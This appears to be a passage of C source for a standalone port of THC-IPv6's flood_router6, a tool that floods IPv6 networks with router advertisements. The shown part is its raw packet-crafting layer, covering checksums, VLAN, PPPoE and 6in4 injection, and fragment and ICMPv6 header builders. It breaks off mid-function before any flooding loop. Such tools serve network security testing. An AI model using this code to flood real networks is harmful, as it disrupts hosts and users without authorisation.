/*
 * This is a standalone version of flood_router6.c that does not have any dependencies.
 *
 * Adapted from https://github.com/mmoya/pkg-thc-ipv6/blob/master/flood_router6.c
 *
 * Author: Daniel Liscinsky, 03/21/2018
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
//#include <sys/time.h>
//#include <sys/resource.h>
//#include <sys/wait.h>
#include <time.h>
 //#include <pcap.h>
 //#include "thc-ipv6.h"
//#include <endian.h>

 /* network */
#include <sys/socket.h>
//#include <netinet/in.h>
#include <arpa/inet.h>
//#include <netdb.h>
#include <net/if.h>

#if !defined (SIOCGIFHWADDR)
	//#include <ifaddrs.h>
	//#include <net/if_dl.h>
	#include <netinet/if_ether.h>
#else
	#include <linux/if_ether.h>
	//#include <linux/netlink.h>
#endif

/* files */
//#include <fcntl.h>
#include <sys/ioctl.h>



#define VERSION 	"v2.7"
#define AUTHOR 		"Daniel Lisincsky"
#define ORIGINAL_AUTHOR 		"van Hauser / THC <vh@thc.org>"
#define RESOURCE	"www.thc.org"

#define SHOW_LIBRARY_ERRORS 1



#define ICMP6_UNREACH     1
#define ICMP6_TOOBIG      2
#define ICMP6_TTLEXEED    3
#define ICMP6_PARAMPROB   4
#define ICMP6_PING        128
#define ICMP6_PONG        129
#define ICMP6_PINGREQUEST 128
#define ICMP6_PINGREPLY   129
#define ICMP6_ECHOREQUEST 128
#define ICMP6_ECHOREPLY   129
#define ICMP6_MLD_QUERY   130
#define ICMP6_MLD_REPORT  131
#define ICMP6_MLD_DONE    132
#define ICMP6_ROUTERSOL   133
#define ICMP6_ROUTERADV   134
#define ICMP6_NEIGHBORSOL 135
#define ICMP6_NEIGHBORADV 136
#define ICMP6_REDIR       137
#define ICMP6_INFOREQUEST 139
#define ICMP6_NODEQUERY   139
#define ICMP6_INFOREPLY   140
#define ICMP6_NODEREPLY   140
#define ICMP6_INVNEIGHBORSOL 141
#define ICMP6_INVNEIGHBORADV 142
#define ICMP6_MLD2_REPORT 143
#define ICMP6_MOBILE_PREFIXSOL 146
#define ICMP6_MOBILE_PREFIXADV 147
#define ICMP6_CERTPATHSOL 148
#define ICMP6_CERTPATHADV 149
#define ICMP6_MLD_ROUTERADV 151
#define ICMP6_MLD_ROUTERSOL 152
#define ICMP6_MLD_ROUTERTERMINATION 153
#define ICMP6_ROUTERPROXYSOL 154
#define ICMP6_ROUTERPROXYADV 155

#define ICMP6_NEIGHBORADV_ROUTER   0x080000000
#define ICMP6_NEIGHBORADV_SOLICIT  0x040000000
#define ICMP6_NEIGHBORADV_OVERRIDE 0x020000000

#define PREFER_HOST     16
#define PREFER_LINK     32
#define PREFER_GLOBAL    0

#if __BYTE_ORDER == __LITTLE_ENDIAN
#define _TAKE4 0
#define _TAKE3 0
#define _TAKE2 0
#elif __BYTE_ORDER == __BIG_ENDIAN
#define _TAKE4 (sizeof(void*) - 4)
#define _TAKE3 (sizeof(void*) - 3)
#define _TAKE2 (sizeof(void*) - 2)
#else
#error "Unknown Byte Order!"
#endif



#define DO_CHECKSUM 0xfaf4

#define NXT_IP6 41
#define NXT_IPV6 41
#define NXT_INVALID 128
#define NXT_IGNORE 31
#define NXT_HDR 0
#define NXT_HOP 0
#define NXT_HBH 0
#define NXT_ROUTE 43
#define NXT_FRAG 44
#define NXT_NONXT 59
#define NXT_OPTS 60
#define NXT_DST 60
#define NXT_ESP 50
#define NXT_AH 51
#define NXT_MIPV6 135
#define NXT_MOBILITY 135
#define NXT_PIM 103
#define NXT_ICMP6 58
#define NXT_TCP 6
#define NXT_UDP 17
#define NXT_DATA 255
#define NXT_HOSTID 139
#define NXT_HOSTIDENTIFICATION 139
#define NXT_SHIM 140
#define NXT_SHIM6 140
#define NXT_IP4 4
#define NXT_IPV4 4
#define NXT_IP4_RUDIMENTARY 0xf4
#define NXT_IPV4_RUDIMENTARY 0xf4
#define NXT_IPIP 4
#define NXT_ICMP4 1

#define IPV6_FRAME_TYPE 0x86dd



typedef struct {
	unsigned char *pkt;
	int pkt_len;
	char *next_segment;
	char *final;
	int final_type;
	unsigned int version;         // :4;
	unsigned char class;
	unsigned int label;           // :20;
	unsigned int length;          // :16;
	unsigned char next;
	unsigned char ttl;
	unsigned char src[16];
	unsigned char dst[16];
	unsigned char *final_dst;
	unsigned char *original_src;
} thc_ipv6_hdr;

typedef struct {
	char *next_segment;
	unsigned char next;
	unsigned char length;
	unsigned char *data;
	int data_len;
} thc_ipv6_ext_hdr;

typedef struct {
	unsigned char type;
	unsigned char code;
	unsigned int checksum:16;
	unsigned int flags;
	unsigned char *data;
	int data_len;
} thc_icmp6_hdr;




// Adapted from "ctype.h"
#define __ascii_isblank(c)  ( (c) == ' ' )
#define __ascii_ispunct(c)  ( ('!' <= (c) && (c) <= '/') || (':' <= (c) && (c) <= '@') || ('[' <= (c) && (c) <= '`') || ('{' <= (c) && (c) <= '~') )
#define __ascii_iswalpha(c)  ( ('A' <= (c) && (c) <= 'Z') || ( 'a' <= (c) && (c) <= 'z'))
#define __ascii_iswdigit(c)  ( '0' <= (c) && (c) <= '9')
#define isprint(c)  ( (__ascii_isblank(c)) || (__ascii_ispunct(c)) || (__ascii_iswalpha(c)) || (__ascii_iswdigit(c)) )






int debug = 0;
int _thc_ipv6_showerrors = SHOW_LIBRARY_ERRORS;
int do_hdr_size = 0, do_hdr_vlan = 0;

// injection variables
#define _PPPOE_HDR_SIZE   22
#define _6IN4_HDR_SIZE  34
int do_6in4 = 0, do_pppoe = 0, do_hdr_off = 0;
char *do_hdr = NULL, *do_capture = NULL;

// other internal global vars
char default_interface[16] = "eth0";
int thc_socket = -1;
int _thc_ipv6_rawmode = 0;



void thc_ipv6_rawmode(int mode) {
	_thc_ipv6_rawmode = mode;
	fprintf(stderr, "Error: raw mode is not working, use THC_IPV6_... injection!\n");
	exit(-1);
}

unsigned char *thc_ipv6_dummymac() {
	char *ptr = malloc(7);

	if (ptr == NULL)
		return NULL;
	memset(ptr, 0xff, 6);
	ptr[6] = 0;
	return ptr;
}

unsigned char *thc_ipv62string(unsigned char *ipv6) {
	char *string = malloc(33);
	int a;

	if (ipv6 != NULL && string != NULL) {
		for (a = 0; a < 16; a++) {
			if (ipv6[a] / 16 >= 10)
				string[a * 2] = 'a' + ipv6[a] / 16 - 10;
			else
				string[a * 2] = '0' + ipv6[a] / 16;
			if (ipv6[a] % 16 >= 10)
				string[a * 2 + 1] = 'a' + ipv6[a] % 16 - 10;
			else
				string[a * 2 + 1] = '0' + ipv6[a] % 16;
		}
		string[32] = 0;
	} else {
		free(string);
		return NULL;
	}

	return string;
}

unsigned char *thc_string2ipv6(unsigned char *string) {
	unsigned char *ipv6 = malloc(16);
	int a;

	if (string != NULL && ipv6 != NULL) {
		for (a = 0; a < 16; a++) {
			ipv6[a] = (string[2 * a] >= 'a' ? 10 + string[2 * a] - 'a' : string[2 * a] - '0') * 16;
			ipv6[a] += string[2 * a + 1] >= 'a' ? 10 + string[2 * a + 1] - 'a' : string[2 * a + 1] - '0';
		}
	} else {
		free(ipv6);
		return NULL;
	}

	return ipv6;
}

void thc_dump_data(unsigned char *buf, int len, char *text) {
	unsigned char *p = (unsigned char *) buf;
	unsigned char lastrow_data[16];
	int rows = len / 16;
	int lastrow = len % 16;
	int i, j;

	if (buf == NULL || len == 0)
		return;

	if (text != NULL && text[0] != 0)
		printf("%s (%d bytes):\n", text, len);
	for (i = 0; i < rows; i++) {
		printf("%04hx:  ", i * 16);
		for (j = 0; j < 16; j++) {
			printf("%02x", p[(i * 16) + j]);
			if (j % 2 == 1)
				printf(" ");
		}
		printf("   [ ");
		for (j = 0; j < 16; j++) {
			if (isprint(p[(i * 16) + j]))
				printf("%c", p[(i * 16) + j]);
			else
				printf(".");
		}
		printf(" ]\n");
	}
	if (lastrow > 0) {
		memset(lastrow_data, 0, sizeof(lastrow_data));
		memcpy(lastrow_data, p + len - lastrow, lastrow);
		printf("%04hx:  ", i * 16);
		for (j = 0; j < lastrow; j++) {
			printf("%02x", p[(i * 16) + j]);
			if (j % 2 == 1)
				printf(" ");
		}
		while (j < 16) {
			printf("  ");
			if (j % 2 == 1)
				printf(" ");
			j++;
		}
		printf("   [ ");
		for (j = 0; j < lastrow; j++) {
			if (isprint(p[(i * 16) + j]))
				printf("%c", p[(i * 16) + j]);
			else
				printf(".");
		}
		while (j < 16) {
			printf(" ");
			j++;
		}
		printf(" ]\n");
	}
}

int calculate_checksum(unsigned char *data, int data_len) {
	int i = 0, checksum = 0;

	if (debug)
		thc_dump_data(data, data_len, "Checksum Packet Data");

	while (i < data_len) {
		if (i++ % 2 == 0)
			checksum += *data++;
		else
			checksum += *data++ << 8;
	}

	checksum = (checksum & 0xffff) + (checksum >> 16);
	checksum = htons(~checksum);

	return checksum;
}

int checksum_pseudo_header(unsigned char *src, unsigned char *dst, unsigned char type, unsigned char *data, int length) {
	unsigned char ptr[40 + length + 48];
	int checksum;

	if (((type != NXT_IP4 && type != NXT_ICMP4) && (src == NULL || dst == NULL)) || data == NULL || length < 0)
		return -1;

	if (length + 40 > 65535)
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Warning: checksums for packets > 65535 are unreliable due implementation differences on target platforms\n");

	memset(&ptr, 0, 40 + length);

	if (type == NXT_IP4 || type == NXT_IP4_RUDIMENTARY || type == NXT_ICMP4) {
		memcpy(ptr, data, length);
		checksum = calculate_checksum(ptr, length);
	} else {
		memcpy(&ptr[0], src, 16);
		memcpy(&ptr[16], dst, 16);
		ptr[34] = length / 256;
		ptr[35] = length % 256;
		ptr[39] = type;
		if (data != NULL && length > 0)
			memcpy(&ptr[40], data, length);

		checksum = calculate_checksum(ptr, 40 + length);
	}

	/*if (length > 65495) {
	printf("DEBUG length: %d, high: %d, low: %d, sum: %x\n", length, ptr[34], ptr[35], checksum);
	printf("65535: %x\n", calculate_checksum(ptr, 65535));
	printf("65536: %x\n", calculate_checksum(ptr, 65536));
	printf("65535+40: %x\n", calculate_checksum(ptr, 65535 + 40));
	printf("65535+40: %x\n", calculate_checksum(ptr, 65536 + 40));
	}*/

	if (type == NXT_UDP && checksum == 0)
		checksum = 65535;

	if (debug)
		printf("Checksum: %d = %p, %p, %d, %p, %d\n", checksum, src, dst, type, data, length);

	return checksum;
}

int thc_open_ipv6() {
	char *ptr, *ptr2, tbuf[6], vbuf[4];
	int i = 0;
	struct sockaddr_in servaddr;

	if (thc_socket >= 0)
		return thc_socket;

	if ((ptr = getenv("THC_IPV6_VLAN")) != NULL && strlen(ptr) > 0) {
		ptr = strdup(ptr);
		ptr2 = ptr;
		i = 0;
		while ((ptr2 = index(ptr2, ',')) != NULL) {
			i++;
			ptr2++;
		}
		if (i != 2) {
			fprintf(stderr, "Error: wrong Syntax in THC_IPV6_VLAN variable: source_mac,dst_mac,vlan_id - e.g. 01:02:03:04:05:06,07:08:09:a0:a1:a2,7\n");
			exit(-1);
		}
		ptr2 = strtok(ptr, ",");
		ptr2 = strtok(NULL, ",");
		ptr2 = strtok(NULL, ",");
		i = atoi(ptr2);
		if (strlen(ptr) < 1 || i < 0 || i > 4097 || (i == 0 && ptr[0] != '0')) {
			fprintf(stderr, "Error: wrong Syntax in THC_IPV6_VLAN variable: srcmac,dstmac,vlan-id - e.g. 01:02:03:04:05:06,1a:1b:1c:1d:1e:1f,7\n");
			exit(-1);
		}
		vbuf[0] = 0x81;
		vbuf[1] = 0x00;
		vbuf[2] = i / 256;
		vbuf[3] = i % 256;
		do_hdr_vlan = 1;
		do_hdr_off = 4;
		free(ptr);
		printf("Information: VLAN injection/sniffing activated\n");
	}

	if ((ptr = getenv("THC_IPV6_PPPOE")) != NULL && strlen(ptr) > 0) {
		i = 0;
		do_pppoe = 1;
		do_hdr_size = _PPPOE_HDR_SIZE + do_hdr_off;
		if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
			fprintf(stderr, "Error: could not allocate necessary memory\n");
			exit(-1);
		}
		ptr2 = ptr;

		while ((ptr2 = index(ptr2, ',')) != NULL) {
			i++;
			ptr2++;
		}
		if (i != 2) {
			fprintf(stderr, "Error: wrong Syntax in THC_IPV6_PPPOE variable: source_mac,dst_mac,ppoe_session_id - e.g. 01:02:03:04:05:06,07:08:09:a0:a1:a2,a1b2\n");
			exit(-1);
		}
		ptr2 = strtok(ptr, ",");
		sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[6], (unsigned int *) &do_hdr[7], (unsigned int *) &do_hdr[8], (unsigned int *) &do_hdr[9], (unsigned int *) &do_hdr[10], (unsigned int *) &do_hdr[11]);
		memcpy(tbuf, do_hdr + 6, 6);
		ptr2 = strtok(NULL, ",");
		sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[0], (unsigned int *) &do_hdr[1], (unsigned int *) &do_hdr[2], (unsigned int *) &do_hdr[3], (unsigned int *) &do_hdr[4], (unsigned int *) &do_hdr[5]);
		memcpy(do_hdr + 6, tbuf, 6);
		if (do_hdr_vlan)
			sprintf(do_capture, /*"ether proto 0x8100 and */"ether src %18s", ptr2);
		else
			sprintf(do_capture, /*"ether proto 0x8864 and */"ether src %18s", ptr2);
		if (do_hdr_vlan)
			memcpy(do_hdr + 12, vbuf, 4);
		do_hdr[12 + do_hdr_off] = 0x88;
		do_hdr[13 + do_hdr_off] = 0x64;
		// PPPoE Header
		do_hdr[14 + do_hdr_off] = 0x11;
		do_hdr[15 + do_hdr_off] = 0;
		ptr2 = strtok(NULL, ",");
		if (strlen(ptr2) != 4) {
			fprintf(stderr, "Error: PPPoE session ID must be hexadecimal and a length of four, e.g. 0a1f\n");
			exit(-1);
		}
		tbuf[0] = ptr2[0];
		tbuf[1] = ptr2[1];
		tbuf[2] = 0;
		sscanf(tbuf, "%x", (unsigned int *) &do_hdr[16 + do_hdr_off]);
		tbuf[0] = ptr2[2];
		tbuf[1] = ptr2[3];
		sscanf(tbuf, "%x", (unsigned int *) &do_hdr[17 + do_hdr_off]);
		// 2 bytes length: 18+19
		do_hdr[20 + do_hdr_off] = 0x00;
		do_hdr[21 + do_hdr_off] = 0x57;
		if (debug) thc_dump_data(do_hdr, do_hdr_size + do_hdr_off, "PPPoE Header");
		//    if (/*verbose &&*/ _thc_ipv6_showerrors)
		printf("Information: PPPoE injection/sniffing activated\n");
	} else
		if ((ptr = getenv("THC_IPV6_6IN4")) != NULL && strlen(ptr) > 0) {
			do_6in4 = 1;
			do_hdr_size = _6IN4_HDR_SIZE + do_hdr_off;
			if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
				fprintf(stderr, "Error: could not allocate necessary memory\n");
				exit(-1);
			}

			ptr2 = ptr;
			while ((ptr2 = index(ptr2, ',')) != NULL) {
				i++;
				ptr2++;
			}
			if (i != 3) {
				fprintf(stderr, "Error: wrong Syntax in THC_IPV6_6IN4 variable: source_mac,dst_mac,src_ip,dst_ip - e.g. 01:02:03:04:05:06,07:08:09:a0:a1:a2,1.1.1.1,2.2.2.2\n");
				exit(-1);
			}
			ptr2 = strtok(ptr, ",");
			sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[6], (unsigned int *) &do_hdr[7], (unsigned int *) &do_hdr[8], (unsigned int *) &do_hdr[9], (unsigned int *) &do_hdr[10], (unsigned int *) &do_hdr[11]);
			memcpy(tbuf, do_hdr + 6, 6);
			ptr2 = strtok(NULL, ",");
			sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[0], (unsigned int *) &do_hdr[1], (unsigned int *) &do_hdr[2], (unsigned int *) &do_hdr[3], (unsigned int *) &do_hdr[4], (unsigned int *) &do_hdr[5]);
			memcpy(do_hdr + 6, tbuf, 6);
			if (do_hdr_vlan)
				memcpy(do_hdr + 12, vbuf, 4);

			do_hdr[12 + do_hdr_off] = 8;
			do_hdr[13 + do_hdr_off] = 0;
			// IPv4 Hdr
			do_hdr[14 + do_hdr_off] = 0x45;
			do_hdr[15 + do_hdr_off] = 0;
			// 2 bytes length: 16+17
			do_hdr[18 + do_hdr_off] = 0;
			do_hdr[19 + do_hdr_off] = 0;
			do_hdr[20 + do_hdr_off] = 0;
			do_hdr[21 + do_hdr_off] = 0;
			do_hdr[22 + do_hdr_off] = 64;
			do_hdr[23 + do_hdr_off] = 41; // proto ipv6
			do_hdr[24 + do_hdr_off] = 0;
			do_hdr[25 + do_hdr_off] = 0;
			// hdr chksum: 24+25
			ptr2 = strtok(NULL, ",");
			if (inet_pton(AF_INET, ptr2, &servaddr.sin_addr) != 1) {
				fprintf(stderr, "Error: 6in4: not a valid IPv4 address: %s\n", ptr2);
				exit(-1);
			}
			memcpy(do_hdr + 26 + do_hdr_off, &servaddr.sin_addr, 4);
			ptr2 = strtok(NULL, ",");
			if (inet_pton(AF_INET, ptr2, &servaddr.sin_addr) != 1) {
				fprintf(stderr, "Error: 6in4: not a valid IPv4 address: %s\n", ptr2);
				exit(-1);
			}
			memcpy(do_hdr + 30 + do_hdr_off, &servaddr.sin_addr, 4);
			if (do_hdr_vlan)
				sprintf(do_capture, /*"ether proto 0x8100 and */"ether src %18s", ptr2);
			else
				sprintf(do_capture, "ip proto 41 and src %16s", ptr2);
			if (debug) thc_dump_data(do_hdr, do_hdr_size, "6in4 Header");
			//    if (/*verbose &&*/ _thc_ipv6_showerrors)
			printf("Information: 6in4 injection/sniffin activated\n");
		}
	if (do_hdr_vlan == 1 && do_6in4 == 0 && do_pppoe == 0) {
		do_hdr_size = 14 + do_hdr_off;
		if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
			fprintf(stderr, "Error: could not allocate necessary memory\n");
			exit(-1);
		}
		ptr = getenv("THC_IPV6_VLAN");
		ptr2 = strtok(ptr, ",");
		sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[6], (unsigned int *) &do_hdr[7], (unsigned int *) &do_hdr[8], (unsigned int *) &do_hdr[9], (unsigned int *) &do_hdr[10], (unsigned int *) &do_hdr[11]);
		memcpy(tbuf, do_hdr + 6, 6);
		ptr2 = strtok(NULL, ",");
		sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *) &do_hdr[0], (unsigned int *) &do_hdr[1], (unsigned int *) &do_hdr[2], (unsigned int *) &do_hdr[3], (unsigned int *) &do_hdr[4], (unsigned int *) &do_hdr[5]);
		memcpy(do_hdr + 6, tbuf, 6);
		memcpy(do_hdr + 12, vbuf, 4);
		do_hdr[16] = 0x86;
		do_hdr[17] = 0xdd;
		sprintf(do_capture, /*"ether proto 0x8100 and */"ether src %18s", ptr2);
	}

	if (_thc_ipv6_rawmode)
		return socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));     // XXX BUG TODO FIXME : no this is not working. //TODO : changed SOCK_DGRAM to SOCK_RAW : is it fixed now? ~DL
	else
		return socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
}

unsigned char *thc_create_ipv6_extended(char *interface, int prefer, int *pkt_len, unsigned char *src, unsigned char *dst, int ttl, int length, int label, int class, int version) {
	thc_ipv6_hdr *hdr;
	unsigned char *my_src;
	char *pkt = NULL;

	*pkt_len = 40;
	pkt = malloc(sizeof(thc_ipv6_hdr));
	hdr = (thc_ipv6_hdr *) pkt;
	if (pkt == NULL)
		return NULL;

	hdr->pkt = NULL;
	hdr->pkt_len = 0;

	if (src == NULL) {
		//my_src = thc_get_own_ipv6(interface, dst, prefer);
		fprintf(stderr, "Error: no IPv6 source address provided (it's NULL), this version is unable to get the IPv6 address of an interface\n");
		free(pkt);
		return NULL;
	}
	else
		my_src = src;

	if (dst == NULL || my_src == NULL) {
		if (src == NULL)
			free(my_src);
		free(pkt);
		return NULL;
	}

	memcpy(hdr->src, my_src, 16);
	memcpy(hdr->dst, dst, 16);
	hdr->final_dst = hdr->dst;
	hdr->original_src = hdr->src;
	if (version == 0)
		hdr->version = 6;
	else
		if (version == -1)
			hdr->version = 0;
		else
			hdr->version = version;
	if (length == -1)
		hdr->length = 0;
	else
		hdr->length = length;
	if (class == -1)
		hdr->class = 0;
	else
		hdr->class = class;
	if (label == -1)
		hdr->label = 0;
	else
		hdr->label = label;
	if (ttl == 0)
		hdr->ttl = 255;
	else
		if (ttl == -1)
			hdr->ttl = 0;
		else
			hdr->ttl = ttl;

	hdr->next_segment = NULL;
	hdr->final = NULL;
	hdr->next = NXT_NONXT;
	hdr->final_type = NXT_NONXT;

	if (src == NULL)
		free(my_src);
	return pkt;
}

int thc_add_hdr_misc(unsigned char *pkt, int *pkt_len, unsigned char type, int len, unsigned char *buf, int buflen) {
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *) hdr->final, *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
	unsigned char *buf2 = malloc((buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6));

	if (nehdr == NULL || hdr == NULL || buf == NULL || buf2 == NULL) {
		if (buf2 != NULL)
			free(buf2);
		if (nehdr != NULL)
			free(nehdr);
		return -1;
	}

	if (ehdr == NULL) {
		hdr->next = type;
		hdr->next_segment = (char *) nehdr;
	} else {
		ehdr->next = type;
		ehdr->next_segment = (char *) nehdr;
	}
	hdr->final = (char *) nehdr;
	hdr->final_type = type;

	memset(buf2, 0, (buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6));
	memcpy(buf2, buf, buflen);

	nehdr->next_segment = NULL;
	nehdr->next = NXT_NONXT;
	nehdr->data = buf2;
	nehdr->data_len = (buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6);
	if (len == -1)
		nehdr->length = (nehdr->data_len + 1) / 8;
	else
		nehdr->length = len % 256;
	hdr->length += (buflen % 8 == 6 ? buflen + 2 : (((buflen + 1) / 8) * 8) + 6 + 2);
	*pkt_len += (buflen % 8 == 6 ? buflen + 2 : (((buflen + 1) / 8) * 8) + 6 + 2);

	return 0;
}

int thc_add_hdr_oneshotfragment(unsigned char *pkt, int *pkt_len, unsigned int id) {
	unsigned char buf[6];
	int pid;

	memset(buf, 0, sizeof(buf));
	if (id == 0) {
		pid = getpid();
		memcpy(buf + 2, (char *) &pid + _TAKE4, 4);
		buf[4] = 0xb0;
		buf[5] = 0x0b;
	} else
		memcpy(buf + 2, (char *) &id + _TAKE4, 4);
	return thc_add_hdr_misc(pkt, pkt_len, NXT_FRAG, -1, buf, sizeof(buf));
}

int thc_add_hdr_fragment(unsigned char *pkt, int *pkt_len, int offset, char more_frags, unsigned int id) {
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *) hdr->final, *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
	unsigned char *buf = malloc(6);
	int coffset = (offset > 8191 ? 8191 : offset) << 3;

	if (offset > 8191) {
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Error: fragment offset can not be larger than 8191 (2^13 - 1)\n");
		free(nehdr);
		free(buf);
		return -1;
	}

	if (nehdr == NULL || hdr == NULL || buf == NULL) {
		free(nehdr);
		free(buf);
		return -1;
	}

	if (ehdr == NULL) {
		hdr->next = NXT_FRAG;
		hdr->next_segment = (char *) nehdr;
	} else {
		ehdr->next = NXT_FRAG;
		ehdr->next_segment = (char *) nehdr;
	}
	hdr->final = (char *) nehdr;
	hdr->final_type = NXT_FRAG;

	if (more_frags)
		coffset++;
	memset(buf, 0, 6);
	buf[0] = coffset / 256;
	buf[1] = coffset % 256;
	buf[2] = id / 16777216;
	buf[3] = (id % 16777216) / 65536;
	buf[4] = (id % 65536) / 256;
	buf[5] = id % 256;

	nehdr->next_segment = NULL;
	nehdr->next = NXT_NONXT;
	nehdr->data = buf;
	nehdr->data_len = 6;
	nehdr->length = (nehdr->data_len + 1) / 8;
	hdr->length += nehdr->data_len + 2;
	*pkt_len += nehdr->data_len + 2;

	return 0;
}

int thc_add_hdr_dst(unsigned char *pkt, int *pkt_len, unsigned char *buf, int buflen) {
	return thc_add_hdr_misc(pkt, pkt_len, NXT_OPTS, -1, buf, buflen);
}

int thc_add_hdr_hopbyhop(unsigned char *pkt, int *pkt_len, unsigned char *buf, int buflen) {
	return thc_add_hdr_misc(pkt, pkt_len, NXT_HDR, -1, buf, buflen);
}

int thc_add_icmp6(unsigned char *pkt, int *pkt_len, int type, int code, unsigned int flags, unsigned char *data, int data_len, int checksum) {
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_icmp6_hdr *ihdr = malloc(sizeof(thc_icmp6_hdr));
	thc_ipv6_ext_hdr *ehdr;

	if (ihdr == NULL)
		return -1;
	memset(ihdr, 0, sizeof(thc_icmp6_hdr));

	if (hdr->final != NULL) {
		ehdr = (thc_ipv6_ext_hdr *) hdr->final;
		ehdr->next_segment = (char *) ihdr;
		ehdr->next = NXT_ICMP6;
	} else {
		hdr->next_segment = (char *) ihdr;
		hdr->next = NXT_ICMP6;
	}
	hdr->final = (char *) ihdr;
	hdr->final_type = NXT_ICMP6;

	ihdr->type = type;
	ihdr->code = code;
	ihdr->flags = flags;

	if (checksum == 0) {
		ihdr->checksum = DO_CHECKSUM;
	} else
		ihdr->checksum = checksum;

	if (data_len > 0 && data != NULL) {
		if ((ihdr->data = malloc(data_len)) == NULL)
			return -1;
		ihdr->data_len = data_len;
		memcpy(ihdr->data, data, data_len);
	} else {
		ihdr->data = NULL;
		ihdr->data_len = 0;
	}

	hdr->length += data_len + 8;
	*pkt_len += data_len + 8;

	return 0;
}

int thc_add_data6(unsigned char *pkt, int *pkt_len, unsigned char type, unsigned char *data, int data_len) {
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *) hdr->final, *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
	unsigned char *buf = malloc(data_len);

	if (nehdr == NULL || hdr == NULL || buf == NULL) {
		free(nehdr);
		free(buf);
		return -1;
	}

	if (ehdr == NULL) {
		hdr->next = NXT_DATA;
		hdr->next_segment = (char *) nehdr;
	} else {
		ehdr->next = NXT_DATA;
		ehdr->next_segment = (char *) nehdr;
	}
	hdr->final = (char *) nehdr;
	hdr->final_type = NXT_DATA;

	memcpy(buf, data, data_len);

	nehdr->next_segment = NULL;
	nehdr->next = type;
	nehdr->data = buf;
	nehdr->data_len = data_len;
	hdr->length += data_len;
	*pkt_len += data_len;

	return 0;
}

int thc_get_mtu(char *interface) {
	int s;
	struct ifreq ifr;

	if (interface == NULL)
		interface = default_interface;

	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
	if (ioctl(s, SIOCGIFMTU, (int8_t *) & ifr) < 0) {
		close(s);
		return -1;
	}

	close(s);
	if (debug)
		printf("DEBUG: MTU %d\n", ifr.ifr_mtu);

	return ifr.ifr_mtu;
}

unsigned char *thc_get_multicast_mac(unsigned char *dst) {
	unsigned char *mac;

	if (_thc_ipv6_rawmode)
		return thc_ipv6_dummymac();

	if (dst == NULL || (mac = malloc(6)) == NULL)
		return NULL;

	mac[0] = 0x33;
	mac[1] = 0x33;
	memcpy(&mac[2], dst + 12, 4);

	return mac;
}



unsigned char *thc_get_mac(char *interface, unsigned char *src, unsigned char *dst) {
	int local = 0;
	FILE *f;
	unsigned char tmpbuf[34], router1[34], router2[34], defaultgw[34] = "", buf[1024], *tmpdst = NULL;
	int a, b, c /*, found = 0, fd = -1 */ ;
	unsigned char tmpd, tmpb;
	char bla[16], *ret, *p1;

	if (thc_socket < 0)
		thc_socket = thc_open_ipv6();
	if (_thc_ipv6_rawmode || do_pppoe || do_6in4 || do_hdr_vlan)
		return thc_ipv6_dummymac();
	if (dst == NULL)
		return NULL;
	if (interface == NULL)
		interface = default_interface;
	if (dst[0] == 0xff)           // then its a multicast target
		return thc_get_multicast_mac(dst);
	//dst[0] == 0xff		is always true since we are multicasting to ff02::1
	
	return NULL;

	/*
	tmpdst = thc_ipv62string(dst);

	if ((f = fopen("/proc/net/if_inet6", "r")) == NULL) {
		fprintf(stderr, "Error: /proc/net/if_inet6 does not exist, no IPv6 support on your Linux box!\n");
		exit(-1);
	}
	while (local == 0 && fgets(buf, sizeof(buf), f) != NULL) {
		if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1], strlen(interface)) == 0) {
			sscanf(buf, "%s %x %x %x %s", tmpbuf, &a, &b, &c, bla);
			if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
				if (b % 4 > 0) {
					tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
					tmpd = tmpdst[b / 4 + 1] >> (b % 4);
					if (tmpb == tmpd) {
						local = 1;
					}
				} else
					local = 1;
			}
		}
	}
	fclose(f);
	if (debug)
		printf("DEBUG: is mac local: %d\n", local);

	if (!local) {
		if ((f = fopen("/proc/net/ipv6_route", "r")) == NULL) {
			fprintf(stderr, "Error: /proc/net/ipv6_route does not exist, no IPv6 support on your Linux box!\n");
			exit(-1);
		}
		while (local == 0 && fgets(buf, sizeof(buf), f) != NULL) {
			if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1], strlen(interface)) == 0) {
				sscanf(buf, "%s %x %s %x %s %s", tmpbuf, &b, router1, &a, router2, bla);
				if (b > 0) {
					if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
						if (b % 4 > 0) {
							tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
							tmpd = tmpdst[b / 4 + 1] >> (b % 4);
							if (tmpb == tmpd)
